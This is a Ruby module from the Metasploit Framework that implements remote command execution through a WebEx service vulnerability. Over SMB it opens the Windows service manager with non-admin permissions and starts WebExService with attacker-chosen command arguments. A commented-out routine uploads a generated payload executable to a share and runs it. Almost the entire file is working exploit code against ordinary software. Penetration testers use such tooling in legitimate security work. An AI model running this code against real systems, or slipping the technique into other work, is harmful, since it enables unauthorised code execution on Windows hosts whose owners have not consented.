# -*- coding: binary -*-
require 'rex/proto/dcerpc/svcctl'
require 'windows_error'
require 'windows_error/win32'
require 'msf/core/exploit/exe'
require 'msf/core/exploit/wbemexec'

include WindowsError::Win32

module Msf

####
# Makes use of a WebEx service vulnerability that works similarly to psexec.
#
# This code was stolen straight out of the psexec module which was stolen from
# the standalone Psexec tool. Thanks very much for all who contributed to that
# module!! Instead of uploading and running a binary.
####

module Exploit::Remote::SMB::Client::WebExec

  include Msf::Exploit::Windows_Constants
  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Failure

  def initialize(info = {})
    super
    register_options(
      [
        OptString.new('SERVICE_NAME', [ false, 'The service name', 'WebExService']),
      ], self.class)

    register_advanced_options(
      [
        OptBool.new('SERVICE_PERSIST', [ true, 'Create an Auto run service and do not remove it.', false])
      ], self.class)
  end

  def execute_single_command(command, opts)
    command = command.split(/ /)
    svc_status = opts[:svc_client].startservice(opts[:svc_handle], ["install", "software-update", "1", *command])
    case svc_status
    when ERROR_SUCCESS
      print_good("Service started successfully...")
    when ERROR_FILE_NOT_FOUND
      print_error("Service failed to start - FILE_NOT_FOUND")
    when ERROR_ACCESS_DENIED
      print_error("Service failed to start - ACCESS_DENIED")
    when ERROR_SERVICE_REQUEST_TIMEOUT
      print_good("Service start timed out")
    else
      print_error("Service failed to start, ERROR_CODE: #{svc_status}")
    end
  end

  # Executes a single windows command.
  #
  # If you want to retrieve the output of your command you'll have to
  # echo it to a .txt file and then use the {#smb_read_file} method to
  # retrieve it.  Make sure to remove the files manually or use
  # {Exploit::FileDropper#register_files_for_cleanup} to have the
  # {Exploit::FileDropper#cleanup} and
  # {Exploit::FileDropper#on_new_session} handlers do it for you.
  #
  # @param command [String] Should be a valid windows command
  # @param disconnect [Boolean] Disconnect afterwards
  # @return [Boolean] Whether everything went well
  def wexec(disconnect=true)
    simple.connect("\\\\#{datastore['RHOST']}\\IPC$")
    handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
    vprint_status("Binding to #{handle} ...")
    dcerpc_bind(handle)
    vprint_status("Bound to #{handle} ...")
    vprint_status("Obtaining a service manager handle...")

    svc_client = Rex::Proto::DCERPC::SVCCTL::Client.new(dcerpc)
    # This is the only permission non-admin gets on Windows 7 (and likely others)
    scm_handle, scm_status = svc_client.openscmanagerw(datastore['RHOST'], 0x00001)

    if scm_status == ERROR_ACCESS_DENIED
      print_error("ERROR_ACCESS_DENIED opening the Service Manager")
    end

    return false unless scm_handle

    # These are the best permissions I could use for a non-admin account on Windows 7
    svc_handle = svc_client.openservicew(scm_handle, datastore['SERVICE_NAME'], 0x2003d)

    if svc_handle.nil?
      print_error("No service handle retrieved")
      return false
    end

    vprint_status("Starting the service...")
    begin
      yield({ :svc_client => svc_client, :svc_handle => svc_handle })
    ensure
      vprint_status("Closing service handle...")
      svc_client.closehandle(svc_handle)
    end

    if disconnect
      simple.disconnect("\\\\#{datastore['RHOST']}\\IPC$")
    end

    true
  end

#  def native_upload(smb_share)
#    filename = "#{Rex::Text.rand_text_alpha(8)}.exe"
#    serviceencoder = ''
#
#    # Upload the shellcode to a file
#    print_status("Uploading payload... #{filename}")
#    smbshare = smb_share
#    fileprefix = ""
#    # if SHARE = Users/sasha/ or something like this
#    if smbshare =~ /.[\\\/]/
#      subfolder = true
#      smbshare = smb_share.dup
#      smbshare = smbshare.gsub(/^[\\\/]/,"")
#      folder_list = smbshare.split(/[\\\/]/)
#      smbshare = folder_list[0]
#      fileprefix = folder_list[1..-1].map {|a| a + "\\"}.join.gsub(/\\$/,"") if folder_list.length > 1
#      simple.connect("\\\\#{datastore['RHOST']}\\#{smbshare}")
#      fd = smb_open("#{fileprefix}\\#{filename}", 'rwct', write: true)
#    else
#      subfolder = false
#      simple.connect("\\\\#{datastore['RHOST']}\\#{smbshare}")
#      fd = smb_open("#{filename}", 'rwct', write: true)
#    end
#
#    exe = ''
#    begin
#      exe = generate_payload_exe({})
#
#      fd << exe
#    ensure
#      fd.close
#    end
#
#    if subfolder
#      print_status("Created \\#{fileprefix}\\#{filename}...")
#    else
#      print_status("Created \\#{filename}...")
#    end
#
#    # Disconnect from the share
#    simple.disconnect("\\\\#{datastore['RHOST']}\\#{smbshare}")
#
#    # define the file location
#    if smb_share == 'ADMIN$'
#      # Unfortunately, %SYSTEMROOT% does not expand for us; we can rely on $PATH, fortunately!
#      file_location = filename
#    elsif smb_share =~ /^[a-zA-Z]\$$/
#      file_location = smb_share.slice(0,1) +  ":\\#{filename}"
#    else
#      file_location = "\\\\127.0.0.1\\#{smbshare}\\#{fileprefix}\\#{filename}"
#    end
#
#    wexec(false) do |opts|
#      execute_command(file_location, opts)
#    end
#
#    # TODO This fails to work due to the .exe being actively running
##    unless datastore['SERVICE_PERSIST']
##      print_status("Deleting \\#{filename}...")
##      #This is not really useful but will prevent double \\ on the wire :)
##      if smb_share =~ /.[\\\/]/
##        simple.connect("\\\\#{datastore['RHOST']}\\#{smbshare}")
##        begin
##          simple.delete("#{fileprefix}\\#{filename}")
##        rescue XCEPT::ErrorCode => e
##          print_error("Delete of \\#{fileprefix}\\#{filename} failed: #{e.message}")
##        end
##      else
##        simple.connect("\\\\#{datastore['RHOST']}\\#{smbshare}")
##        begin
##          simple.delete("#{filename}")
##        rescue XCEPT::ErrorCode => e
##          print_error("Delete of \\#{filename} failed: #{e.message}")
##        end
##      end
##    end
#  end
end
end
